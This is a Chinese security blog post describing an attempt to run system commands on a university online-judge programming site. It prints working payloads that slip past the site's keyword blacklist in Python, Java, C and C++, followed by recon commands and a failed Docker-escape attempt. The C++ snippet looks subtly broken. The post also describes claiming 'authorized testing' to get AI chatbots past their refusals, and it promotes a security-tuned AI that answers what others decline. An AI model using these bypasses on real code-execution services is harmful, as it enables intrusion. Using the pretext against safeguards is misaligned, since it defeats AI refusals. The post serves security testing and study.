#  【漏洞挖掘案例】不是哥们，北大被"RCE"了？   
原创 X1ly?S  The One安全   2025-03-24 21:11  
  
![](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIOaGdTSic7ficNnZm2twDmlXcroxAsGDIctRJicY3ic8KqMB7QuoibTL2kzQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
# 01  
  
  
  
前言  
  
团队的师傅突然发来一句，"要RCE北大了"，还配上了一个截图，是执行了ls /  
的全回显结果，卧槽，我直呼牛逼，当时就兴奋了，于是我那天晚上忙(耍)完也去对北大做了信息收集，想去找找看这位师傅所说的可以RCE的站点，后面确实被"RCE"了，觉得有点意思，于是有了这篇文章。  
  
  
信息收集就不说了，收集下来几千条资产。根据那位师傅的描述，他说那个系统就是类似于"PTA"在线编程系统的，于是结合这个信息，对子域名进行了简单的排查，推测并快速定位到了某一个系统，点开一看，就是在线做一些编程题目的，那么八九不离十就是这个系统了  
  
![image-20250324165049461](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIOXmK3WL2z8eesibJgbp6eVicxp0QexlREfVXmgH4P7fyXeALCN7CPpOg/640?wx_fmt=png&from=appmsg "")  
  
哟西，可以注册，黑客狂喜(bushi)，注册一个测试账号  
  
直接来到题目做题，因为这里做编程题，不就是能执行我们编写的代码嘛？根据那位师傅的截图，推测肯定是这里编写程序时可以执行系统命令导致的"RCE"  
  
![image-20250324165231436](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIhecDYuK3UEvLGOdXRzm8jBW329zGyW5ibg483n9TGNVboXaH1C9F6eg/640?wx_fmt=png&from=appmsg "")  
  
选一个最简单的经典hello word  
  
![image-20250324165245133](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIh2Qamic1qtjsKG58xnQzWc2UWXciaEEtrTdNDy8OBZCyWScamUtEQnZQ/640?wx_fmt=png&from=appmsg "")  
  
预期的是这样子，输出一个"hello world"，可以选择不同的几种语言实现，输出"Accepted"代表答案正确  
  
![image-20250323204847898](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIhZd9kibpZfDIel96QTmerPp6NlohEBoFXLK9mDJJwyZRxudEWBIrfQQ/640?wx_fmt=png&from=appmsg "")  
  
那么我们肯定要尝试执行系统命令啊  
  
  
# 02  
  
  
  
代码执行绕过  
  
  
01  
  
python  
  
  
先从简单的python开始吧，构造一个最简短的执行系统命令的python代码，越短越好  
  
```
__import__(os).system('ls /')
```  
  
  
只有一行代码，导入os库，使用system函数执行ls /  
命令  
  
先执行看看  
  
![image-20250323210939752](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIkIqEppe1bmzA3coSoPjIgiaArjB643lPoO6AM4ic5fn1CEgia7qkgYsHw/640?wx_fmt=png&from=appmsg "")  
  
运行失败，被拦截了，因为代码里有被禁止的部分，应该还没到python的运行环境之前就被检测机制拦截掉了，为了验证我们添加一个test  
，使得python语法错误，看看是先报语法错误还是先拦截执行？  
  
![image-20250323211321965](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIj679aibLEGbmiaeFqrXBkM4lxYyxKibkXZoVk362uQVH8Ir2j40EibsosA/640?wx_fmt=png&from=appmsg "")  
  
果然是直接拦截执行，那这说明了什么呢？是不是说明这种拦截机制不是动态的，而是静态的黑名单检测，就是只是在运行代码之前禁用了一些危险的库和函数，那么这就很ez啦，我们直接FUZZ出来被禁用的部分再替换它，就能绕过检测执行任意命令啦~  
  
我们这里有几个变量os  
，system  
，ls  
  
我们一个一个破坏他们，看看还拦不拦截，控制变量法，就能FUZZ出来被禁用的部分了  
  
先破坏system  
，还是被拦截，说明不是禁用的system  
  
![image-20250323213208251](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIAiafTsCdPbOICln9Lrexx8iaAjm53KNqSAaJyd1T10kylBv2dlyM41Zg/640?wx_fmt=png&from=appmsg "")  
  
破坏os  
试试，还原system  
  
哟西不拦截了，进入到了python执行环境里，说明就是拦截的os  
  
![image-20250323213408163](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIHmK92RSHepbTLfmggkicK2SDjgtiajwG0jSuB7yx6X7SOzTcrwXX9qhg/640?wx_fmt=png&from=appmsg "")  
  
怎么绕过呢？只需要拼接字符串就行了  
  
没有拦截啦！  
  
![image-20250323213640516](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIQ3I2BVgadHH8SFOkL0buh8yEdKlLNWiad3QZKUbqoS8qMN4Ny8oicN0w/640?wx_fmt=png&from=appmsg "")  
  
```
```  
  
  
成功执行命令！  
  
![image-20250323213734999](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIlfez6t2yE0hOuCkCnTG9WibeKtOPTmbJUDBqu92pkrmUd98DW1RaFNA/640?wx_fmt=png&from=appmsg "")  
  
这种就是基于禁用的正面对抗，就是你不让我用os  
，我就变一下形，字符串拼接或者编码绕过都可以  
  
还有反面对抗，就是你不让我用这些常规的执行命令的库与函数，那么我就猜测你没有禁用一些罕见的方式，我们借助一些特殊的机制就能执行代码，从而绕过。  
> 如法炮制即可，举点例子：  
  
  
  
02  
  
Java  
  
  
○ 绕过原理：字节数组构造字符串，将敏感字符串（如java.lang.Runtime  
、getRuntime  
、exec  
等）转换为字节数组。在运行时通过new String(new byte[]{...})  
动态构造这些字符串，避免在代码中直接写出敏感单词。  
  
```
import java.util.Scanner;publicclassMain {    publicstaticvoidmain(String[] args)throws Exception {               Class<?> runtimeClass = Class.forName(newString(newbyte[] { 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101 }));        ObjectruntimeInstance= runtimeClass.getMethod(newString(newbyte[] { 103, 101, 116, 82, 117, 110, 116, 105, 109, 101 })).invoke(null);                Processprocess= (Process) runtimeClass.getMethod(newString(newbyte[] { 101, 120, 101, 99 }), String.class)            .invoke(runtimeInstance, newString(newbyte[] { 108, 115 }));        newScanner(process.getInputStream()).useDelimiter("\\A").forEachRemaining(System.out::println);    }}
```  
  
  
  
03  
  
C     
  
  
○ 绕过原理：使用execve  
或fork  
+execvp  
,execve  
是一个低级别的系统调用，通常不会被禁用  
  
```
#include <unistd.h>int main() {    char *args[] = {"/bin/sh", "-c", "ls /", NULL};    execve("/bin/sh", args, NULL);    return 0;}
```  
  
  
  
04  
  
C++  
  
  
○ 绕过原理：通过修改函数指针的地址，将func  
伪装为system  
，绕过system  
关键字静态检测  
  
```
#include <cstdlib>int main() {    char s[] = {115, 121, 115, 116, 101, 109, 0};    int (*func)(const char*) = (int (*)(const char*))std::getenv("PATH");    *(void**)&func = (void*)std::getenv;      return func("ls /");}
```  
  
  
  
# 03  
  
  
  
进一步测试  
  
05  
  
看看权限  
  
  
  
```
whoami
```  
  
  
  
![image-20250324163205166](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vI6ILKZpPP06lYLaf0micq60N4TRhMIL7JbuvYI1AOYiaHUeBCqpTwRudA/640?wx_fmt=png&from=appmsg "")  
  
很低的一个权限  
  
  
06  
  
判断是否是docker环境  
  
  
  
```
ls -l /.dockerenv
```  
  
  
  
![image-20250324161436460](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vInD05M7RNJyFfDv8KYiados6FkicwsdxPicAz7q5HTcqLBaI4GnaHacFibQ/640?wx_fmt=png&from=appmsg "")  
  
那十有八九就是docker环境了  
  
  
07  
  
尝试docker逃逸  
  
  
什么，你不记得docker逃逸的命令了吗，问问AI吧……  
  
○ ChatGPT  
  
![image-20250324163426183](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vI1P92WJkGlQZMsJJz2NaTZENrElnU2OKt3LRQiawbDUarGzmbRvcEfgg/640?wx_fmt=png&from=appmsg "")  
  
在有些情况下，问到一些敏感危险的技术问题时，往往需要提示一下AI，我只是在做合法的授权测试，不会造成危害等等，它才会输出问题答案  
  
○ DeepSeek  
  
那问问DeepSeek呢?  
  
DeepSeek有时候还是不太稳定，问久了服务就繁忙了，不过也比最开始好多了  
  
![image-20250324163816634](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIqkqFRsGbZa3ZuzXQM85TCXjaxDlftYqJoF7YomtVNv8AJcNIg3ckbw/640?wx_fmt=png&from=appmsg "")  
  
○ 元宝  
  
![image-20250324164447022](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIOQA5q29tk0Z21x2ZZUFKHkPa557YICGmaiaP8m9cDteQrPQTg4W6Yew/640?wx_fmt=png&from=appmsg "")  
  
元宝也是这样，被限制回答了  
  
○ 无问  
  
那问问无问社区的AI呢，这是一个专门为网络安全进行了优化微调的AI，在网络安全的问题中，某些情况下，可以表现得更专业、更直接。一些时候，还能回答一些被其他AI认为是敏感危险的技术问题~  
  
![image-20250324162219081](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIiafqmRtyWZRicCzOiaickibRycwXFaAkU0OlMiaXRfdEYR5E9ebEc2eNaH5A/640?wx_fmt=png&from=appmsg "")  
  
尝试了所有的docker逃逸的方式，都以失败告终，推测应该是权限不足的问题，当前命令执行环境严格受限，又或者这里的确不存在docker逃逸的漏洞  
  
![image-20250324162946695](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIABUWiaxJNGsbZHsCSsuxQjiarpCzpgibWibdhqHcRuaZY0YRbnJttiaCe4Q/640?wx_fmt=png&from=appmsg "")  
  
  
  
# 04  
  
  
  
结语  
  
于是就到此为止了，也不是真实的RCE，只是docker环境的RCE，并且权限很低，甚至许多常规命令都无法执行，环境很苛刻，不能被docker逃逸，于是也不算漏洞吧我觉得，只是觉得有点意思，就像一个入门的CTF题目一样哈哈，大佬们轻喷（水了一篇文章，对不起啦~）  
  
  
# 05  
  
  
  
无问社区  
  
邀请注册链接：  
https://www.wwlib.cn/index.php/login/icode/d8d2b4dde2847db7  
  
社区的技术文库也是干货满满~  
  
![image-20250324171118409](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIMLfHBTnjXQsNAnKpicqOgiaOtuhjzX2rrQQIUkiaGjMUGBkf9fm0s8bqQ/640?wx_fmt=png&from=appmsg "")  
  
![image-20250324171223717](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIo7Bpr7mUicTccjHd47iaxFO6NmibeqcAtSbQ3T5OM5ybGLFmgGRnDhgyA/640?wx_fmt=png&from=appmsg "")  
  
![image-20250324171353026](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIKNoGUgI6ZVJ3MfSAX3TDcv0puCSdnXBB6olAIf9hicmiaraA0Y1kp2DA/640?wx_fmt=png&from=appmsg "")  
  
  
![poster](https://mmbiz.qpic.cn/mmbiz_png/gxdFmXz8afmTtarmDLgWbhzZYiciau85vIJ3htuMyRqTQsGiaERxwBys10sEecGibGaaUQibDNfITAP8nat7Ppe76Fw/640?wx_fmt=png&from=appmsg "")  
  
  
